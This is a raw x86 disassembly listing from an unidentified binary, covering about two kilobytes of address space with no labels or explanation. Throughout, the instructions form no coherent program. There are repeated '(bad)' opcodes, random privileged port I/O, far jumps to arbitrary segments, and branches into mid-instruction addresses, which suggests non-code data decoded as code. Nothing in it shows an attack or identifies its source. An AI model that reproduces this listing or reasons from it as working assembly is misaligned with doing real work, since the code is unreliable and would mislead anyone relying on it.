  418bc3:	dec    esi
  418bc4:	icebp  
  418bc5:	xlat   BYTE PTR ds:[ebx]
  418bc6:	or     BYTE PTR [ecx+0x5fc89516],ch
  418bcc:	mov    dl,0x4f
  418bce:	xor    ebp,DWORD PTR [ebp+0x7e8e8594]
  418bd4:	sbb    eax,0x36b45461
  418bd9:	mov    esi,0x16ade3dd
  418bde:	pushf  
  418bdf:	stos   DWORD PTR es:[edi],eax
  418be0:	xchg   BYTE PTR [eax+0x19],cl
  418be3:	(bad)  
  418be4:	shl    BYTE PTR [ecx+ecx*8],1
  418be7:	loope  0x418b8a
  418be9:	loope  0x418bc5
  418beb:	ins    DWORD PTR es:[edi],dx
  418bec:	iret   
  418bed:	push   ebp
  418bee:	popf   
  418bef:	add    BYTE PTR [ebp+0x24],0xfd
  418bf3:	dec    ecx
  418bf4:	cmp    ch,BYTE PTR [edx]
  418bf6:	imul   ebx,DWORD PTR [ecx+ecx*8-0x1beefaa3],0xfec4fec5
  418c01:	das    
  418c02:	xchg   edx,eax
  418c03:	jmp    0x4f0e:0x29536db4
  418c0a:	fimul  DWORD PTR [edi-0x56f7c041]
  418c10:	fs xchg edx,eax
  418c12:	leave  
  418c13:	sti    
  418c14:	mov    ch,0x46
  418c16:	or     edi,esi
  418c18:	lods   eax,DWORD PTR ds:[esi]
  418c19:	xchg   ebp,eax
  418c1a:	cli    
  418c1b:	add    eax,0xdbefcbb0
  418c20:	adc    DWORD PTR [ebx-0x1d60b3c4],edi
  418c26:	adc    BYTE PTR [bx+di-0x59],ah
  418c2a:	adc    al,0xc5
  418c2c:	and    esi,DWORD PTR [esi]
  418c2e:	mov    eax,0xe1fe7beb
  418c33:	mov    al,0xc8
  418c35:	and    al,0x43
  418c37:	push   ds
  418c38:	pop    es
  418c39:	mov    ch,0x84
  418c3b:	mov    esi,DWORD PTR [esi+0x68]
  418c3e:	(bad)  
  418c3f:	test   BYTE PTR [edx+0x77],0x75
  418c43:	call   0x722bde5f
  418c48:	call   0xb55cffeb
  418c4d:	aas    
  418c4e:	ror    BYTE PTR [ebx],cl
  418c50:	lock in eax,0xc
  418c53:	and    DWORD PTR [edi-0x1],ecx
  418c56:	addr16 pop es
  418c58:	dec    edi
  418c59:	(bad)  
  418c5a:	test   al,0x94
  418c5c:	scas   al,BYTE PTR es:[edi]
  418c5d:	(bad)  
  418c5e:	into   
  418c5f:	call   0xa01:0x439d83d6
  418c66:	mov    ebx,0xf569a25b
  418c6b:	js     0x418bf9
  418c6d:	lods   eax,DWORD PTR ds:[esi]
  418c6e:	push   es
  418c6f:	sub    ebx,DWORD PTR [eax+0x26]
  418c72:	mov    al,0x24
  418c74:	xor    al,0xc0
  418c76:	enter  0x3c3,0xaa
  418c7a:	adc    eax,0xb680fc11
  418c7f:	cmp    al,dh
  418c81:	sahf   
  418c82:	and    edx,ecx
  418c84:	and    BYTE PTR [ebp-0x690bd80c],dl
  418c8a:	je     0x418cac
  418c8c:	sub    eax,0x73fd2303
  418c91:	addr16 jnp 0x418c57
  418c94:	pop    esp
  418c95:	xor    al,0x47
  418c97:	aas    
  418c98:	out    0xb6,al
  418c9a:	dec    ebp
  418c9b:	xchg   ecx,eax
  418c9c:	leave  
  418c9d:	xchg   ebp,eax
  418c9e:	cmc    
  418c9f:	aaa    
  418ca0:	icebp  
  418ca1:	in     eax,0x4a
  418ca3:	xchg   esi,eax
  418ca4:	xor    DWORD PTR [esi],0x168d2f10
  418caa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418cab:	pop    esp
  418cac:	xor    ecx,DWORD PTR [eax+0x7b]
  418caf:	and    DWORD PTR [edi-0x7d],esp
  418cb2:	sbb    al,0xbe
  418cb4:	add    eax,0xf50cab06
  418cb9:	dec    ebx
  418cba:	push   ss
  418cbb:	jecxz  0x418d3c
  418cbd:	inc    ecx
  418cbe:	inc    ebp
  418cbf:	arpl   sp,bp
  418cc1:	inc    ebp
  418cc2:	adc    ch,BYTE PTR [esp+ecx*4+0x48]
  418cc6:	mov    ecx,0xb65f0dd3
  418ccb:	fimul  WORD PTR [edi+0x1a]
  418cce:	les    ebx,FWORD PTR [edx-0x35d883e5]
  418cd4:	(bad)  
  418cd5:	cli    
  418cd6:	into   
  418cd7:	in     al,0x8c
  418cd9:	test   DWORD PTR [ebp-0x310ad3a7],eax
  418cdf:	xchg   esp,eax
  418ce0:	inc    ebx
  418ce1:	jle    0x418c83
  418ce3:	jns    0x418d03
  418ce5:	mov    dh,0xe6
  418ce7:	mov    ah,0xb
  418ce9:	or     BYTE PTR [edx+0x2e],cl
  418cec:	sub    dh,BYTE PTR [bp+di+0x59]
  418cf0:	and    DWORD PTR [ecx-0x5096e591],ebx
  418cf6:	jecxz  0x418d72
  418cf8:	bound  esi,QWORD PTR [ebp+0x1fdd713d]
  418cfe:	and    eax,0x5de77426
  418d03:	pop    ebx
  418d04:	push   esp
  418d05:	xlat   BYTE PTR ds:[ebx]
  418d06:	je     0x418ceb
  418d08:	ret    
  418d09:	pop    edx
  418d0b:	lea    esi,[ebx+ecx*1+0x68]
  418d0f:	or     edx,ebx
  418d11:	pop    ebx
  418d12:	push   esi
  418d13:	(bad)  [edx]
  418d15:	mov    ds:0x904e19ef,al
  418d1a:	jo     0x418cf3
  418d1c:	lock sub BYTE PTR [eax],0x7d
  418d20:	add    ebp,0x4030af7f
  418d26:	out    0xd,al
  418d28:	das    
  418d29:	cwde   
  418d2a:	pop    edx
  418d2b:	sahf   
  418d2c:	jl     0x418cf2
  418d2e:	cmp    eax,DWORD PTR [ecx+0x48e6fdee]
  418d34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d35:	mov    al,dl
  418d37:	cmp    al,0x9e
  418d39:	or     ch,BYTE PTR [ebx+0x7c]
  418d3c:	je     0x418d7a
  418d3e:	and    DWORD PTR [esi],0x2ebb282c
  418d44:	push   0x902836c3
  418d49:	pusha  
  418d4a:	xchg   esp,eax
  418d4b:	xchg   ebp,eax
  418d4c:	sbb    dh,BYTE PTR [edx-0x7b]
  418d4f:	adc    eax,0xa78e2825
  418d54:	pop    edi
  418d55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d56:	xchg   bh,bl
  418d58:	fsub   st,st(5)
  418d5a:	mov    bl,0x10
  418d5c:	cmp    esp,edx
  418d5e:	(bad)  
  418d5f:	mov    ebx,0x2d63da42
  418d64:	xor    eax,0x1ea885b7
  418d69:	lahf   
  418d6a:	jge    0x418db5
  418d6c:	scas   eax,DWORD PTR es:[edi]
  418d6d:	arpl   di,si
  418d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d70:	cli    
  418d71:	adc    eax,0x6639a11a
  418d76:	ret    
  418d77:	scas   eax,DWORD PTR es:[edi]
  418d78:	or     edx,DWORD PTR [ecx-0x73]
  418d7b:	push   edx
  418d7c:	pusha  
  418d7d:	fcomp  st(1)
  418d7f:	jnp    0x418dd9
  418d81:	xor    esp,eax
  418d83:	mov    ds:0xa6b7c2fd,eax
  418d88:	dec    edi
  418d89:	daa    
  418d8a:	aam    0x18
  418d8c:	xor    eax,0x98e63d4f
  418d91:	mov    dh,0x9d
  418d93:	loop   0x418dea
  418d95:	or     eax,0xac3d95e9
  418d9a:	test   eax,0xdf0441aa
  418d9f:	push   edi
  418da0:	dec    edi
  418da1:	sbb    bl,dh
  418da3:	sbb    ebx,DWORD PTR [ecx+edi*1-0xb]
  418da7:	xor    eax,ecx
  418da9:	inc    eax
  418daa:	or     eax,0x4e5457ed
  418daf:	inc    edi
  418db0:	lods   eax,DWORD PTR ds:[esi]
  418db1:	push   ds
  418db2:	ficom  WORD PTR [ebx-0x1c]
  418db5:	gs mov ch,0xe6
  418db8:	pop    ds
  418db9:	(bad)  
  418dba:	(bad)  
  418dbb:	mov    ebp,0xacb93f96
  418dc0:	call   0x130b:0x91d9c68d
  418dc7:	shl    BYTE PTR [ebp+0x31],0xa3
  418dcb:	test   BYTE PTR [ecx-0x5f5e5c1f],dl
  418dd1:	xchg   DWORD PTR [ecx+0x65202ed8],ebx
  418dd7:	and    bh,BYTE PTR [ebx]
  418dd9:	cmp    al,bl
  418ddb:	push   0x45
  418ddd:	add    edx,edi
  418ddf:	clc    
  418de0:	(bad)  
  418de1:	pop    esp
  418de2:	push   eax
  418de3:	add    dh,BYTE PTR [edx-0x22c02ec5]
  418de9:	test   al,0x50
  418deb:	sub    al,0x1f
  418ded:	ss sub sp,0x49
  418df2:	xchg   DWORD PTR [edi],esi
  418df4:	mov    ah,0xa9
  418df6:	lock hlt 
  418df8:	jmp    0x9515:0x9feb6bae
  418dff:	xchg   esp,eax
  418e00:	lahf   
  418e01:	out    dx,eax
  418e02:	fsub   DWORD PTR [esi+0x302a65dd]
  418e08:	repz (bad) 
  418e0b:	adc    eax,0x126ecbbc
  418e10:	mov    WORD PTR [edi-0x40],ds
  418e13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e14:	pusha  
  418e15:	and    eax,0x76357406
  418e1a:	sti    
  418e1b:	add    bh,BYTE PTR [ebx+edi*8]
  418e1e:	rcl    dh,1
  418e20:	push   ebp
  418e21:	sbb    DWORD PTR [esi],ecx
  418e23:	fild   WORD PTR [edx-0x5c67c0fc]
  418e29:	inc    edi
  418e2a:	cs pop ecx
  418e2c:	les    ebp,FWORD PTR [esi-0x7357ea7a]
  418e32:	cs inc ecx
  418e34:	outs   dx,BYTE PTR ds:[esi]
  418e35:	adc    edi,eax
  418e37:	adc    dl,BYTE PTR [ebx+ebx*4-0x59]
  418e3b:	cdq    
  418e3c:	cld    
  418e3d:	pusha  
  418e3e:	or     eax,DWORD PTR fs:[ebp+0x6b]
  418e42:	dec    esi
  418e43:	dec    ebp
  418e44:	scas   al,BYTE PTR es:[edi]
  418e45:	test   al,0xfc
  418e47:	bound  eax,QWORD PTR [esi-0x5180898f]
  418e4d:	jb     0x418e96
  418e4f:	lds    eax,FWORD PTR [ebp-0x40]
  418e52:	sbb    BYTE PTR [ebx-0x43487399],ch
  418e58:	add    DWORD PTR [edi],edi
  418e5a:	sets   BYTE PTR ds:0xb939aed2
  418e61:	mov    bh,0xe2
  418e63:	arpl   sp,ax
  418e65:	test   dh,ch
  418e67:	pop    esp
  418e68:	rcl    BYTE PTR [ebx],0x49
  418e6b:	(bad)  
  418e6c:	repz jmp 0xd761651e
  418e72:	mov    bh,0x69
  418e74:	push   ebx
  418e75:	push   0xffffffe1
  418e77:	and    eax,0x2a8c7c42
  418e7c:	scas   al,BYTE PTR es:[edi]
  418e7d:	cmp    al,0x8c
  418e7f:	xor    al,BYTE PTR [esi]
  418e81:	packsswb mm4,QWORD PTR [edx]
  418e84:	mov    ebx,0x6ac5abde
  418e8a:	gs pop edx
  418e8c:	xchg   edi,eax
  418e8d:	popa   
  418e8e:	jmp    0x418eeb
  418e90:	dec    ebp
  418e91:	or     al,0xc6
  418e93:	dec    eax
  418e94:	leave  
  418e95:	sbb    BYTE PTR [edi+0x7e],ah
  418e98:	cli    
  418e99:	add    al,0x82
  418e9b:	inc    ecx
  418e9c:	mov    al,0xa5
  418e9e:	mov    ds,WORD PTR fs:[ebx]
  418ea1:	and    cl,BYTE PTR [edx+0x3c]
  418ea4:	in     al,0x9a
  418ea6:	cmp    dl,BYTE PTR [esi]
  418ea8:	mov    ebp,DWORD PTR [eax+0x46b993fe]
  418eae:	loop   0x418e6d
  418eb0:	mov    ebp,gs
  418eb2:	mov    dh,0x66
  418eb4:	cwde   
  418eb5:	retf   0x2e6d
  418eb8:	mov    ebx,0x9bccaf59
  418ebd:	mov    esi,0xade8aaee
  418ec2:	retf   0x3afd
  418ec5:	xor    esp,DWORD PTR [edx-0x1f]
  418ec8:	xor    BYTE PTR ds:0x97ae95b1,dl
  418ece:	adc    BYTE PTR [eax+ebp*2],bh
  418ed1:	pop    eax
  418ed2:	fist   WORD PTR [ecx+0x695ae09]
  418ed8:	push   esp
  418ed9:	xor    DWORD PTR [edi+eiz*2],ecx
  418edc:	test   eax,0x5b7c0e76
  418ee1:	pusha  
  418ee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ee3:	sub    bh,BYTE PTR [edi-0x32094f35]
  418ee9:	mov    dl,0xa0
  418eeb:	loope  0x418e81
  418eed:	pop    edx
  418eee:	or     edi,ebx
  418ef0:	fnstenv [edi]
  418ef2:	inc    ebp
  418ef3:	add    al,BYTE PTR [ecx+0x76e10b27]
  418ef9:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418efb:	bound  ebx,QWORD PTR [esi]
  418efd:	cs mov ebx,0xf820576d
  418f03:	cdq    
  418f04:	pop    ebp
  418f05:	test   eax,0xf6345264
  418f0a:	push   es
  418f0b:	icebp  
  418f0c:	xor    DWORD PTR ds:0x5dfb9214,esp
  418f12:	jb     0x418e9c
  418f14:	mov    ds:0x119b2265,eax
  418f19:	ds mov bh,0xe6
  418f1c:	add    DWORD PTR [esi+0x68e0f447],ecx
  418f22:	cwde   
  418f23:	std    
  418f24:	repz mov esp,0xaf6d971a
  418f2a:	outs   dx,DWORD PTR ds:[esi]
  418f2b:	(bad)  
  418f2d:	and    DWORD PTR [esi-0x189864f8],esi
  418f33:	dec    eax
  418f34:	loop   0x418f45
  418f36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f37:	dec    eax
  418f38:	aas    
  418f39:	mov    es,edi
  418f3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f3c:	sahf   
  418f3d:	repz dec edi
  418f3f:	push   edi
  418f40:	inc    ebp
  418f41:	mov    ebp,0xc50819d1
  418f46:	xor    al,0x99
  418f48:	test   esi,esi
  418f4a:	cmp    ebp,esp
  418f4c:	sbb    bl,BYTE PTR [eax]
  418f4e:	mov    dh,0x86
  418f50:	call   0xde3a8ccc
  418f55:	scas   eax,DWORD PTR es:[edi]
  418f56:	or     al,0x7e
  418f58:	pushf  
  418f59:	fist   DWORD PTR ds:0x4368d90a
  418f5f:	ds in  al,0x7a
  418f62:	pop    ebx
  418f63:	dec    edi
  418f64:	mov    al,0xd3
  418f66:	mov    BYTE PTR [ebx-0xf],dh
  418f69:	(bad)  [edi+0x4c]
  418f6c:	jecxz  0x418f17
  418f6e:	js     0x418f21
  418f70:	pop    edx
  418f71:	jecxz  0x418f9c
  418f73:	sti    
  418f74:	xchg   edx,eax
  418f75:	test   eax,esp
  418f77:	(bad)  
  418f78:	loopne 0x418f01
  418f7a:	or     DWORD PTR [edi],esp
  418f7c:	mov    dh,0xc7
  418f7e:	pusha  
  418f7f:	std    
  418f80:	jle    0x418fe2
  418f82:	bound  ebx,QWORD PTR [ecx+0x15929bb8]
  418f88:	ror    DWORD PTR [ebx+0x3c],1
  418f8b:	xchg   edi,eax
  418f8c:	pop    ebp
  418f8d:	or     eax,0x6dad46d7
  418f92:	pop    esi
  418f93:	out    dx,al
  418f94:	fstp   st(1)
  418f96:	clc    
  418f97:	adc    ah,dh
  418f99:	ss sti 
  418f9b:	jae    0x418fa2
  418f9d:	pop    ebp
  418f9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f9f:	adc    al,0x8b
  418fa1:	xchg   esi,eax
  418fa2:	data16 xor cl,BYTE PTR [esi-0x62]
  418fa6:	in     al,dx
  418fa7:	and    edi,DWORD PTR [ebp-0x3a3146b7]
  418fad:	dec    edx
  418fae:	pushf  
  418faf:	mov    al,0xb1
  418fb1:	stc    
  418fb2:	jnp    0x418fd8
  418fb4:	popf   
  418fb5:	push   0xaf82a38b
  418fba:	jb     0x418f5e
  418fbc:	std    
  418fbd:	inc    edi
  418fbe:	dec    esi
  418fbf:	pop    ebx
  418fc0:	add    BYTE PTR [edi+0x27],dl
  418fc3:	jmp    0xeede:0xe1ee147d
  418fca:	daa    
  418fcb:	inc    edi
  418fcc:	inc    esi
  418fcd:	clc    
  418fce:	into   
  418fcf:	jmp    0xca758afe
  418fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fd5:	xor    BYTE PTR [edx-0x24423d28],ah
  418fdb:	leave  
  418fdc:	adc    cl,0x16
  418fdf:	add    al,BYTE PTR [edx-0x7]
  418fe2:	pop    esp
  418fe3:	cmp    al,bh
  418fe5:	daa    
  418fe6:	idiv   ecx
  418fe8:	push   ebx
  418fe9:	jecxz  0x41902d
  418feb:	fisubr WORD PTR [eax-0x7f963d3a]
  418ff1:	adc    eax,0x41a3dda0
  418ff6:	in     eax,0xb8
  418ff8:	pop    edi
  418ff9:	sbb    cl,BYTE PTR [ebx-0x3384779e]
  418fff:	stos   BYTE PTR es:[edi],al
  419000:	or     al,0x99
  419002:	sti    
  419003:	mov    eax,0x5925bd06
  419008:	xchg   esp,eax
  419009:	nop
  41900a:	xchg   ebp,eax
  41900b:	jns    0x418ff1
  41900d:	neg    BYTE PTR [ebp-0x46]
  419010:	(bad)  
  419011:	adc    eax,0x896e0dae
  419016:	mov    esp,0xefdc6e73
  41901b:	iret   
  41901c:	push   edx
  41901d:	push   ds
  41901e:	jns    0x419026
  419020:	push   esp
  419021:	repz fisttp WORD PTR [edx]
  419024:	mov    ebp,0x2045e0a6
  419029:	sbb    cl,cl
  41902b:	aaa    
  41902c:	aas    
  41902d:	pop    ss
  41902e:	mov    ds:0xda2be795,al
  419033:	adc    al,bl
  419035:	das    
  419036:	pop    ecx
  419037:	mov    al,0xd0
  419039:	aas    
  41903a:	mov    ?,esp
  41903c:	sub    ebp,0xdb34163e
  419042:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419043:	in     eax,dx
  419044:	scas   eax,DWORD PTR es:[edi]
  419045:	sub    eax,DWORD PTR [esi+edi*8+0x5d]
  419049:	addr16 mov ah,0xec
  41904c:	fcomp  QWORD PTR [eax-0xcc4b860]
  419052:	cmp    ch,al
  419054:	imul   esp,esp,0xf26512d1
  41905a:	mov    cl,0xf4
  41905c:	add    eax,0xc37ced90
  419061:	mov    ds:0x8fd6deab,eax
  419066:	pop    ds
  419067:	dec    eax
  419068:	scas   al,BYTE PTR es:[edi]
  419069:	push   ds
  41906a:	dec    ecx
  41906b:	push   edx
  41906c:	adc    bl,BYTE PTR [edx-0x39]
  41906f:	inc    esi
  419070:	jns    0x419033
  419072:	mov    ah,0xfd
  419074:	dec    edi
  419075:	xchg   esi,eax
  419076:	sti    
  419077:	xchg   esi,eax
  419078:	std    
  419079:	add    al,0x45
  41907b:	or     BYTE PTR [edi],bl
  41907d:	jae    0x4190df
  41907f:	sub    eax,DWORD PTR [ecx]
  419081:	jecxz  0x419003
  419083:	out    dx,eax
  419084:	pop    edi
  419085:	add    BYTE PTR [ebp-0x46],bh
  419088:	fwait
  419089:	loopne 0x419051
  41908b:	outs   dx,BYTE PTR ds:[esi]
  41908c:	popa   
  41908d:	cmp    edi,esi
  41908f:	cmp    bh,BYTE PTR [esi-0x136e2a5e]
  419095:	cmp    dl,BYTE PTR [eax-0x5d9f5d26]
  41909b:	mov    gs,edx
  41909d:	jae    0x4190d4
  41909f:	out    dx,al
  4190a0:	imul   ecx,DWORD PTR [ecx+0x59],0x968256b2
  4190a7:	dec    edi
  4190a8:	cmp    DWORD PTR [edi-0x2e924b1a],esi
  4190ae:	test   ebp,edx
  4190b0:	out    dx,eax
  4190b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190b2:	jae    0x4190ac
  4190b4:	ss (bad) 
  4190b6:	mul    DWORD PTR [edx]
  4190b8:	mov    esi,0x3cc1eb31
  4190bd:	and    DWORD PTR [edx-0x22],esp
  4190c0:	or     bl,ah
  4190c2:	repnz mov ds:0x5d3c522b,eax
  4190c8:	push   esp
  4190c9:	sbb    al,0x27
  4190cb:	dec    edi
  4190cc:	rcr    ch,1
  4190ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190cf:	arpl   WORD PTR [ebp+0x7c4b96ce],si
  4190d5:	adc    dl,ch
  4190d7:	mov    esp,0x6b044c62
  4190dc:	push   0x3b
  4190de:	fdiv   QWORD PTR ds:0xe1d0d5d4
  4190e4:	fiadd  WORD PTR ds:0x149b7b2a
  4190ea:	jl     0x419075
  4190ec:	(bad)  
  4190ed:	retf   0xd532
  4190f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190f1:	(bad)  
  4190f2:	clc    
  4190f3:	jmp    0x419146
  4190f5:	add    DWORD PTR [edi],edi
  4190f7:	gs je  0x41908b
  4190fa:	lods   eax,DWORD PTR ds:[esi]
  4190fb:	adc    al,0x42
  4190fd:	xor    ebx,DWORD PTR [ecx+0x1c138983]
  419103:	mov    esi,eax
  419105:	xor    al,0x50
  419107:	cdq    
  419108:	retf   0x335a
  41910b:	sbb    eax,0xbc8e303
  419110:	pop    ecx
  419111:	jmp    0x419166
  419113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419114:	mov    cl,0x6a
  419116:	ds iret 
  419118:	pop    ecx
  419119:	cli    
  41911a:	adc    DWORD PTR [ebp-0x1e],ebx
  41911d:	outs   dx,DWORD PTR ds:[esi]
  41911e:	push   ebx
  41911f:	imul   eax,DWORD PTR [edi],0xea95fbf1
  419125:	fnsetpm(287 only) 
  419127:	dec    edi
  419128:	pop    ss
  419129:	jmp    0xa2bd:0x70311b20
  419130:	pop    es
  419131:	gs pop ss
  419133:	xor    ebx,DWORD PTR [esi+0x32]
  419136:	out    0x8a,eax
  419138:	aad    0xbb
  41913a:	adc    eax,0xb21e1ec2
  41913f:	int    0x69
  419141:	jge    0x419147
  419143:	and    DWORD PTR [esi-0x33],esi
  419146:	ret    
  419147:	adc    cl,BYTE PTR [edx]
  419149:	pop    edx
  41914a:	push   edi
  41914b:	outs   dx,DWORD PTR ds:[esi]
  41914c:	cld    
  41914d:	add    al,0xf0
  41914f:	rcr    BYTE PTR [eax],cl
  419151:	call   0xfa535538
  419156:	or     DWORD PTR [ecx-0x46],0x40
  41915a:	inc    edi
  41915b:	pop    ax
  41915d:	repz push edi
  41915f:	mov    ebp,0xe928d547
  419164:	fild   DWORD PTR [eax-0x5ffb7e48]
  41916a:	sbb    BYTE PTR [edi],0x23
  41916d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41916e:	mov    ebp,0x2297ef6
  419173:	push   es
  419174:	(bad)  
  419175:	aas    
  419176:	enter  0xb7dc,0x18
  41917a:	mov    ch,0x1b
  41917c:	jmp    0x4191d8
  41917e:	xchg   DWORD PTR fs:[edi],esp
  419181:	pusha  
  419182:	xor    eax,0x1ee84b26
  419187:	mov    WORD PTR ds:[ebx+0x2a],ss
  41918b:	xchg   edi,eax
  41918c:	inc    ebp
  41918d:	xlat   BYTE PTR ds:[ebx]
  41918e:	neg    BYTE PTR [ebp-0xc21e6b9]
  419194:	cmp    bl,ch
  419196:	pop    ebx
  419197:	test   ebx,esi
  419199:	inc    esp
  41919a:	sahf   
  41919b:	fwait
  41919c:	stos   BYTE PTR es:[edi],al
  41919d:	ds or  al,0xd
  4191a0:	or     DWORD PTR [edi+ebp*4-0x7602a486],ebp
  4191a7:	mov    ebp,edi
  4191a9:	sbb    al,0xdc
  4191ab:	dec    ebx
  4191ac:	dec    edx
  4191ad:	stc    
  4191ae:	fisubr DWORD PTR [ebp-0x26]
  4191b1:	lea    esp,[esi-0x28]
  4191b4:	jle    0x41922f
  4191b6:	inc    edx
  4191b7:	mov    ebx,DWORD PTR [ecx-0x37]
  4191ba:	mov    dl,0x22
  4191bc:	setb   BYTE PTR cs:[esi-0x629cc50e]
  4191c4:	dec    ebp
  4191c5:	scas   al,BYTE PTR es:[edi]
  4191c6:	inc    esi
  4191c7:	pop    eax
  4191c8:	call   0x7fc9de2d
  4191cd:	and    al,0x9e
  4191cf:	mov    edi,0x98a177f0
  4191d4:	and    al,0x83
  4191d6:	xchg   ecx,eax
  4191d7:	lea    edi,[eax+eax*2-0x11b6bb29]
  4191de:	loope  0x4191ec
  4191e0:	xlat   BYTE PTR ds:[ebx]
  4191e1:	sub    BYTE PTR [esi+0x663fd5bc],dl
  4191e7:	add    dl,ah
  4191e9:	stos   DWORD PTR es:[edi],eax
  4191ea:	and    DWORD PTR [ebx],ebp
  4191ec:	ret    
  4191ed:	pushf  
  4191ee:	rcl    bl,1
  4191f0:	loopne 0x4191c4
  4191f2:	mov    al,ds:0xeeca7bdf
  4191f7:	adc    ebx,DWORD PTR [eax]
  4191f9:	mov    edx,0x5cefba05
  4191fe:	mov    ch,0xe1
  419200:	mov    bl,0x83
  419202:	pop    edx
  419203:	jb     0x41926a
  419205:	test   BYTE PTR [edx],ch
  419207:	add    eax,0xae5cbd60
  41920c:	and    BYTE PTR [edx+ebp*8],bl
  41920f:	xor    eax,0x68e2398c
  419214:	addr16 jnp 0x419254
  419217:	mov    BYTE PTR [ecx-0x3af8de0b],dh
  41921d:	ins    DWORD PTR es:[edi],dx
  41921e:	lods   al,BYTE PTR ds:[esi]
  41921f:	lahf   
  419220:	xor    DWORD PTR [edx+0x31],ebx
  419223:	pop    edi
  419224:	repz mov bh,0x42
  419227:	and    DWORD PTR [edi],eax
  419229:	mov    WORD PTR [ecx-0x64],es
  41922c:	lock loop 0x419276
  41922f:	stos   DWORD PTR es:[edi],eax
  419230:	jle    0x419296
  419232:	lock rcr DWORD PTR [edi+eiz*8-0x646a6805],0xfd
  41923b:	sbb    ah,ah
  41923d:	xchg   ecx,eax
  41923e:	cmp    esi,DWORD PTR [esi+eiz*8-0x29]
  419242:	call   0x2331:0xa1ace335
  419249:	cmp    al,0xa7
  41924b:	sbb    eax,0x149e4af1
  419250:	mov    al,0x32
  419252:	pop    es
  419253:	pusha  
  419254:	addr16 jge 0x419270
  419257:	pop    ds
  419258:	or     bl,BYTE PTR [esi+0x2e84c7f3]
  41925e:	(bad)  
  41925f:	xor    edx,DWORD PTR [ebx-0x36]
  419262:	mov    dl,BYTE PTR [edx]
  419264:	cmp    DWORD PTR [edx-0x29],eax
  419267:	push   ebp
  419268:	jae    0x419250
  41926a:	cmp    eax,0xb1c1028b
  41926f:	ret    
  419270:	and    BYTE PTR [ebp+0x7e7507e2],bl
  419276:	jbe    0x4192aa
  419278:	inc    ebp
  419279:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41927a:	push   ss
  41927b:	mov    eax,0x3c92ef35
  419280:	retf   
  419281:	stc    
  419282:	js     0x4192ea
  419284:	cmp    al,0x12
  419286:	jg     0x419235
  419288:	dec    esp
  419289:	push   eax
  41928a:	push   edi
  41928b:	sub    edi,esi
  41928d:	jp     0x41930d
  41928f:	lock scas eax,DWORD PTR es:[edi]
  419291:	popa   
  419292:	dec    BYTE PTR [eax]
  419294:	xchg   edi,eax
  419295:	ja     0x419257
  419297:	xor    BYTE PTR [eax-0x78],bh
  41929a:	push   edi
  41929b:	jl     0x419233
  41929d:	add    BYTE PTR [edi],dl
  41929f:	mov    bh,0xa3
  4192a1:	push   ebx
  4192a2:	call   0x3c2b:0xf11df989
  4192a9:	adc    BYTE PTR [esi+edi*4-0x72],dl
  4192ad:	dec    ebp
  4192ae:	sbb    al,0xdc
  4192b0:	and    cl,BYTE PTR [ecx-0x73]
  4192b3:	hlt    
  4192b4:	pop    edi
  4192b5:	int3   
  4192b6:	loope  0x419260
  4192b8:	sub    al,0xda
  4192ba:	out    dx,al
  4192bb:	pop    esi
  4192bc:	out    0x8f,eax
  4192be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192bf:	adc    ecx,DWORD PTR [edi+0x656b5775]
  4192c5:	aas    
  4192c6:	inc    eax
  4192c7:	xchg   esi,eax
  4192c8:	adc    BYTE PTR [edi-0x55],dh
  4192cb:	jl     0x4192da
  4192cd:	out    dx,eax
  4192ce:	pusha  
  4192cf:	aad    0x29
  4192d1:	sub    dh,BYTE PTR [edi+0x75]
  4192d4:	cmp    ah,BYTE PTR [edx]
  4192d6:	xor    edi,edi
  4192d8:	xchg   ebx,eax
  4192d9:	push   edi
  4192da:	xor    cl,BYTE PTR [ebx+0xd2281bd]
  4192e0:	in     al,dx
  4192e1:	pop    ss
  4192e2:	ins    DWORD PTR es:[edi],dx
  4192e3:	dec    ecx
  4192e4:	mov    DWORD PTR [edi],eax
  4192e6:	sbb    al,0x75
  4192e8:	ja     0x41930a
  4192ea:	pop    esp
  4192eb:	and    eax,0x7c760253
  4192f0:	in     eax,0x55
  4192f2:	fstp   QWORD PTR ds:0xa8a0cd88
  4192f8:	dec    esp
  4192f9:	jnp    0x419370
  4192fb:	mov    BYTE PTR [ecx],cl
  4192fd:	adc    al,0xe9
  4192ff:	imul   ebp,DWORD PTR [ebx],0x748ee01c
  419305:	xor    ebp,DWORD PTR [esi+esi*4-0x5d6279fc]
  41930c:	mov    al,BYTE PTR [edi-0x417d1c5e]
  419312:	xchg   edi,eax
  419313:	dec    esi
  419314:	xor    ecx,DWORD PTR [eax-0x3d]
  419317:	jecxz  0x4192d0
  419319:	retf   0xd74
  41931c:	mov    cl,0xdc
  41931e:	sub    bl,BYTE PTR [edx+0x55a51724]
  419324:	sbb    eax,0x2695af38
  419329:	data16 cld 
  41932b:	stos   BYTE PTR es:[edi],al
  41932c:	mov    bl,0xbc
  41932e:	mov    esi,0xed9bff41
  419333:	inc    esi
  419334:	push   ecx
  419335:	ja     0x419351
  419337:	les    ebp,FWORD PTR [ecx+ebp*4-0x55dc9a2f]
  41933e:	inc    eax
  41933f:	shl    dh,1
  419341:	pop    edi
  419342:	test   BYTE PTR [edx+0x13734281],ah
  419348:	mov    bh,0xe9
  41934a:	sar    BYTE PTR [ebp-0x4913452],cl
  419350:	xchg   esp,eax
  419351:	lods   al,BYTE PTR ds:[esi]
  419352:	daa    
